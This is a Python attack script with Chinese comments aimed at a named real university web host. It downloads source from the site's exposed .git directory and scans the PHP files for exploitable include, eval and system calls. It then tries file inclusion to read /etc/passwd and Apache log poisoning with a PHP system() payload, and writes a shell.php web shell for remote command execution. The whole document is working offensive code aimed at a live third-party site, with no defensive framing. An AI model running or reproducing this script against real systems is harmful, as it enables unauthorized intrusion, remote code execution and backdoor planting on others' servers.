#!/usr/bin/env python3
import requests
import zlib
import re
urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://olympic.su.ac.th'

# 从index文件解析文件hash
# index文件格式复杂，直接从enmeeting目录tree获取
enmeeting_hash = '18e41f24c7bc3ace2ad3bbbfdd8e85c990d96abd'
tree_path = f'/.git/objects/{enmeeting_hash[:2]}/{enmeeting_hash[2:]}'
resp = requests.get(url + tree_path, verify=False, timeout=10)
tree_data = zlib.decompress(resp.content)
null1 = tree_data.find(b'\0')
pos = null1 + 1

print('enmeeting目录所有文件:')
while pos < len(tree_data):
    null2 = tree_data.find(b'\0', pos)
    if null2 == -1 or null2 + 21 > len(tree_data):
        break
    mode_name = tree_data[pos:null2]
    parts = mode_name.split(b' ', 1)
    if len(parts) == 2:
        mode = parts[0].decode()
        filename = parts[1].decode()
        hash_hex = tree_data[null2+1:null2+21].hex()
        print(f'{mode} {filename} -> {hash_hex}')
        
        if filename.endswith('.php'):
            # 下载并分析
            blob_path = f'/.git/objects/{hash_hex[:2]}/{hash_hex[2:]}'
            resp2 = requests.get(url + blob_path, verify=False, timeout=10)
            if resp2.status_code == 200:
                blob_data = zlib.decompress(resp2.content)
                null_blob = blob_data.find(b'\0')
                if null_blob != -1:
                    content = blob_data[null_blob+1:].decode('utf-8', errors='ignore')
                    
                    # 检查文件包含
                    if 'include' in content or 'require' in content:
                        include_matches = re.findall(r'(include|require)[^;]*\$[^;]*;', content, re.IGNORECASE)
                        if include_matches:
                            params = re.findall(r'\$_(GET|POST|REQUEST|COOKIE)\[["\']([^"\']+)["\']\]', content)
                            if params:
                                print(f'\n  [!] {filename} 文件包含漏洞!')
                                print(f'      参数: {params[:5]}')
                                # 测试
                                web_path = f'enmeeting/{filename}'
                                for param_type, param_name in params[:3]:
                                    test_url = f"{url}/{web_path}?{param_name}=../../../../etc/passwd"
                                    resp3 = requests.get(test_url, verify=False, timeout=5)
                                    if "root:" in resp3.text and resp3.status_code == 200:
                                        print(f'      [+] 文件包含成功: {test_url}')
                                        # 日志包含
                                        php_code = "<?php system($_GET['c']); ?>"
                                        requests.get(f"{url}/{web_path}?{param_name}={php_code}", verify=False, timeout=5)
                                        log_url = f"{url}/{web_path}?{param_name}=../../../../var/log/apache2/access.log&c=id"
                                        shell_resp = requests.get(log_url, verify=False, timeout=5)
                                        if "uid=" in shell_resp.text:
                                            print(f'      [+] Shell获取成功: {log_url}')
                                            exit(0)
                    
                    # 检查eval
                    if 'eval' in content.lower():
                        if re.search(r'eval\s*\([^)]*\$', content, re.IGNORECASE):
                            params = re.findall(r'\$_(GET|POST|REQUEST)\[["\']([^"\']+)["\']\]', content)
                            if params:
                                print(f'\n  [!] {filename} eval RCE!')
                                print(f'      参数: {params[:5]}')
                                web_path = f'enmeeting/{filename}'
                                for param_type, param_name in params[:2]:
                                    test_url = f"{url}/{web_path}?{param_name}=system('id');"
                                    resp3 = requests.get(test_url, verify=False, timeout=5)
                                    if "uid=" in resp3.text:
                                        print(f'      [+] RCE成功: {test_url}')
                                        shell_cmd = f"file_put_contents('shell.php','<?php system($_GET[c]); ?>');"
                                        shell_url = f"{url}/{web_path}?{param_name}={shell_cmd}"
                                        requests.get(shell_url, verify=False, timeout=5)
                                        test_shell = requests.get(f"{url}/enmeeting/shell.php?c=id", verify=False, timeout=5)
                                        if "uid=" in test_shell.text:
                                            print(f'      [+] Shell获取成功: {url}/enmeeting/shell.php?c=id')
                                            exit(0)
                    
                    # 检查system/exec
                    if 'system' in content.lower() or 'exec' in content.lower():
                        if re.search(r'(system|exec)\s*\([^)]*\$', content, re.IGNORECASE):
                            params = re.findall(r'\$_(GET|POST|REQUEST)\[["\']([^"\']+)["\']\]', content)
                            if params:
                                print(f'\n  [!] {filename} 命令执行!')
                                print(f'      参数: {params[:5]}')
                                web_path = f'enmeeting/{filename}'
                                for param_type, param_name in params[:2]:
                                    test_url = f"{url}/{web_path}?{param_name}=id"
                                    resp3 = requests.get(test_url, verify=False, timeout=5)
                                    if "uid=" in resp3.text:
                                        print(f'      [+] 命令执行成功: {test_url}')
                                        shell_cmd = "echo '<?php system($_GET[c]); ?>' > shell.php"
                                        shell_url = f"{url}/{web_path}?{param_name}={shell_cmd}"
                                        requests.get(shell_url, verify=False, timeout=5)
                                        test_shell = requests.get(f"{url}/enmeeting/shell.php?c=id", verify=False, timeout=5)
                                        if "uid=" in test_shell.text:
                                            print(f'      [+] Shell获取成功: {url}/enmeeting/shell.php?c=id')
                                            exit(0)
        pos = null2 + 21
